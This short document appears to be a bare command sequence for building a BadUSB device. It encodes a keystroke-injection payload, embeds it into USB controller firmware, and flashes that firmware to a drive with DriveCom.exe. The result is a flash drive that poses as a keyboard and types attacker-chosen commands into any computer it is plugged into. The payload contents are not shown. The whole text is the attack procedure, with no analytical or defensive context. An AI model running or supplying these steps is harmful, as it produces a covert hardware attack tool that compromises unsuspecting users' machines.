java -jar encoder.jar -i payload.txt -o payload.bin
copy fw_original.bin fw.bin /Y
EmbedPayload.exe payload.bin fw.bin
DriveCom.exe /drive=E /action=SendFirmware /burner=BN07V502TAW.BIN /firmware=fw.bin
